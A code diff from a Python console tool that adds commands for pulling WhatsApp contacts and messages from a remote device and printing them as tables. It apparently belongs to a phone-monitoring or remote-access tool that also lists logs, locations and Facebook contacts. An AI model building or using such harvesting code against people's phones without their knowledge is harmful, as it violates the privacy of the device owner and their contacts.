@@ -25,8 +25,9 @@ def initializeTree():
                  'logs': showLogs,
                  'locations': showLocations,
                  'facebookuser':getFacebookUserName,
-                 'facebookContacts':getFacebookContacts,
                  'whatsappContacts':getWhatsappContacts,
+                 'facebookContacts':getFacebookContacts,
+                 'whatsappMessages ':getWhatsappMessages,
                  'whatsappGroups':getWhatsappGroups
                  },
             'make':
@@ -107,10 +108,28 @@ def getFacebookContacts():
     print(tabulate(contactsList, headers=headers, tablefmt='fancy_grid'))
 
 def getWhatsappContacts():
-    '''Get Whatsapp Chat Details'''
+    '''Get Whatsapp Contacts'''
     contactsList = []
     # Get response from URL
     contacts = getResponse('getWhatsappContacts')
+    print (contacts)
+
+    for x in contacts['contactlist']:
+        contactsList.append([str(x['Display Name']),str(x['Number'])
+        ,str(x['Status'])])
+    
+    
+    # Table part
+    headers = ['Display Name', 'Number','Status']
+    print(tabulate(contactsList, headers=headers, tablefmt='fancy_grid'))
+
+
+
+def getWhatsappMessages():
+    '''Get Whatsapp Chat Details'''
+    contactsList = []
+    # Get response from URL
+    contacts = getResponse('getWhatsappMessages')
     #print (contacts)
 
     for x in contacts['contactlist']:
